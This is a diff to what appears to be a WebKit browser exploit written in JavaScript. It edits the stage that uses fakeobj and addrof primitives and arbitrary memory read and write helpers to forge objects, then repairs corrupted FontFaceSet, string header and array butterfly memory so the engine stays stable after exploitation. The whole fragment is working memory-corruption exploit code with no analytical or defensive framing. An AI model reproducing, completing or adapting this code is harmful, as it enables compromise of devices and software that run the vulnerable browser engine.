@@ -354,7 +354,7 @@ try{
         write_mem(p, arr);
     };
 
-    await (function () {
+    (function () {
         var magic = boot_fakeobj(boot_addrof(obj) + 16);
         magic[4] = addrof_slave;
         magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
@@ -366,16 +366,16 @@ try{
 
     //fix fucked objects to stabilize webkit
 
-    await (function () {
+    await (async function () {
         //fix fontfaceset (memmoved 96 bytes to low, move back)
         var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
-        write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
+        await write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
         //fix strings (restore "valid") header
         for (var i = 0; i < needfix.length; i++) {
             var addr = read_ptr_at(addrof(needfix[i]) + 8);
-            write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
-            write_ptr_at(addr + 8, addr + 20);
-            write_ptr_at(addr + 16, 0x80000014);
+            await write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
+            await write_ptr_at(addr + 8, addr + 20);
+            await write_ptr_at(addr + 16, 0x80000014);
         }
         //fix array butterfly
         write_ptr_at(butterfly + 248, 0x1f0000001f);
